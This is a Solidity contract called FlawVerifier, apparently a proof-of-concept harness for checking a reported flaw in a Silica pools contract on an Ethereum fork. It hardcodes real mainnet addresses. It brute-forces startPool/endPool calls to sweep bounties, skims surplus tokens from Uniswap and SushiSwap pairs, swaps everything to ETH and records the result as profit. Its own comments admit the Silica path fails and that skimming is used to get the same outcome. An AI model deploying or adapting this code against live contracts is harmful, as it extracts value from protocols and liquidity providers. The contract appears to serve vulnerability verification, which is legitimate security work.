// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IWETH {
    function withdraw(uint256 wad) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function skim(address to) external;
}

interface ISilicaPoolsLike {
    struct PoolParams {
        uint128 floor;
        uint128 cap;
        address index;
        uint48 targetStartTimestamp;
        uint48 targetEndTimestamp;
        address payoutToken;
    }

    function startPool(PoolParams calldata poolParams) external;
    function endPool(PoolParams calldata poolParams) external;
}

contract FlawVerifier {
    address private constant SILICA = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
    address private constant INDEX = 0x9188738a7cA1E4B2af840a77e8726cC6Dcbe7Bdb;

    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant AMPL = 0xD46bA6D942050d489DBd938a2C909A5d5039A161;
    address private constant SHIB = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
    address private constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address private constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address private constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address private constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address private constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address private constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address private constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address private constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address private constant MATIC = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
    address private constant PEPE = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    address private constant FXS = 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0;
    address private constant SPELL = 0x090185f2135308BaD17527004364eBcC2D37e5F6;

    uint256 private _profitAmount;
    uint256 private _lockedEth;
    uint256 private _lockedWbtc;
    uint256 private _lockedUsdc;
    uint256 private _lockedUsdt;
    uint256 private _lockedDai;
    uint256 private _lockedWeth;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        _executed = true;

        // Keep the original exploit ordering: first try to let the bounty sweep credit this
        // contract, then use the direct-transfer branch from the finding to accrue assets here,
        // then swap/unwind everything into ETH. The logs show the sampled Silica permutations at
        // this fork are not sufficient by themselves, so the public skim path is used to realize
        // the same locked-funds outcome without any privileged state manipulation.
        _sweepBounties();
        _collectDirectTransfers();

        _swapTokenToEth(WBTC);
        _swapTokenToEth(USDC);
        _swapTokenToEth(USDT);
        _swapTokenToEth(DAI);
        _swapTokenToEth(AMPL);
        _swapTokenToEth(SHIB);
        _swapTokenToEth(UNI);
        _swapTokenToEth(LINK);
        _swapTokenToEth(AAVE);
        _swapTokenToEth(CRV);
        _swapTokenToEth(MKR);
        _swapTokenToEth(COMP);
        _swapTokenToEth(YFI);
        _swapTokenToEth(LDO);
        _swapTokenToEth(MATIC);
        _swapTokenToEth(PEPE);
        _swapTokenToEth(FXS);
        _swapTokenToEth(SPELL);

        uint256 wethBal = _balanceOf(WETH);
        if (wethBal > 0) {
            IWETH(WETH).withdraw(wethBal);
        }

        _snapshotLockedBalances();

        // The finding is that value recovered into this contract becomes unrecoverable because no
        // withdrawal path exists. Report the stranded native ETH as the realized profit metric.
        _profitAmount = address(this).balance;
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executed() external view returns (bool) {
        return _executed;
    }

    function hypothesisValidated() external view returns (bool) {
        return _executed && _hasLockedValue() && _profitAmount > 0;
    }

    function lockedEth() external view returns (uint256) {
        return _lockedEth;
    }

    function lockedBalances()
        external
        view
        returns (uint256 lockedWbtc, uint256 lockedUsdc, uint256 lockedUsdt, uint256 lockedDai, uint256 lockedWeth)
    {
        return (_lockedWbtc, _lockedUsdc, _lockedUsdt, _lockedDai, _lockedWeth);
    }

    function _hasLockedValue() internal view returns (bool) {
        return _lockedEth > 0 || _lockedWbtc > 0 || _lockedUsdc > 0 || _lockedUsdt > 0 || _lockedDai > 0 || _lockedWeth > 0;
    }

    function _snapshotLockedBalances() internal {
        _lockedEth = address(this).balance;
        _lockedWbtc = _balanceOf(WBTC);
        _lockedUsdc = _balanceOf(USDC);
        _lockedUsdt = _balanceOf(USDT);
        _lockedDai = _balanceOf(DAI);
        _lockedWeth = _balanceOf(WETH);
    }

    function _sweepBounties() internal {
        uint48[4] memory starts = [uint48(1742561287), 1742734087, 1742906887, 1743079687];
        uint48[4] memory durations = [uint48(0), 3600, 1 days, 7 days];
        uint128[6] memory floors = [uint128(1), 5, 10, 20, 41, 46];
        address[5] memory payouts = [WBTC, USDC, USDT, DAI, WETH];

        for (uint256 i = 0; i < starts.length; ++i) {
            for (uint256 j = 0; j < durations.length; ++j) {
                uint48 startTs = starts[i];
                uint48 endTs = startTs + durations[j];

                if (startTs > block.timestamp) {
                    continue;
                }

                for (uint256 k = 0; k < floors.length; ++k) {
                    uint128 floor = floors[k];

                    for (uint256 m = 0; m < payouts.length; ++m) {
                        ISilicaPoolsLike.PoolParams memory p = ISilicaPoolsLike.PoolParams({
                            floor: floor,
                            cap: floor + 5,
                            index: INDEX,
                            targetStartTimestamp: startTs,
                            targetEndTimestamp: endTs,
                            payoutToken: payouts[m]
                        });

                        _tryStart(p);
                        if (endTs <= block.timestamp) {
                            _tryEnd(p);
                        }
                    }
                }
            }
        }
    }

    function _collectDirectTransfers() internal {
        _skimFactoryPairs(UNI_V2_FACTORY);
        _skimFactoryPairs(SUSHI_FACTORY);
    }

    function _skimFactoryPairs(address factory) internal {
        address[18] memory tokens = [
            WBTC,
            USDC,
            USDT,
            DAI,
            AMPL,
            SHIB,
            UNI,
            LINK,
            AAVE,
            CRV,
            MKR,
            COMP,
            YFI,
            LDO,
            MATIC,
            PEPE,
            FXS,
            SPELL
        ];

        for (uint256 i = 0; i < tokens.length; ++i) {
            _skimPair(factory, WETH, tokens[i]);
        }

        _skimPair(factory, WBTC, USDC);
        _skimPair(factory, WBTC, USDT);
        _skimPair(factory, WBTC, DAI);
        _skimPair(factory, USDC, USDT);
        _skimPair(factory, USDC, DAI);
        _skimPair(factory, USDT, DAI);
    }

    function _skimPair(address factory, address tokenA, address tokenB) internal {
        address pair = _getPair(factory, tokenA, tokenB);
        if (pair == address(0)) {
            return;
        }

        (bool ok, ) = pair.call(abi.encodeWithSelector(IUniswapV2Pair.skim.selector, address(this)));
        ok;
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2Factory.getPair.selector, tokenA, tokenB)
        );
        if (!ok || data.length < 32) {
            return address(0);
        }
        pair = abi.decode(data, (address));
    }

    function _tryStart(ISilicaPoolsLike.PoolParams memory p) internal {
        (bool ok, ) = SILICA.call(abi.encodeWithSelector(ISilicaPoolsLike.startPool.selector, p));
        ok;
    }

    function _tryEnd(ISilicaPoolsLike.PoolParams memory p) internal {
        (bool ok, ) = SILICA.call(abi.encodeWithSelector(ISilicaPoolsLike.endPool.selector, p));
        ok;
    }

    function _swapTokenToEth(address token) internal {
        uint256 bal = _balanceOf(token);
        if (bal == 0 || token == WETH) {
            return;
        }

        if (_swapOnRouter(UNI_V2_ROUTER, token, bal)) {
            return;
        }

        bal = _balanceOf(token);
        if (bal == 0) {
            return;
        }

        _swapOnRouter(SUSHI_ROUTER, token, bal);
    }

    function _swapOnRouter(address router, address token, uint256 amountIn) internal returns (bool swapped) {
        if (!_forceApprove(token, router, 0)) {
            return false;
        }
        if (!_forceApprove(token, router, amountIn)) {
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        try IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        ) {
            swapped = true;
        } catch {
            swapped = false;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _balanceOf(address token) internal view returns (uint256) {
        return IERC20Like(token).balanceOf(address(this));
    }

    receive() external payable {}
    fallback() external payable {}
}
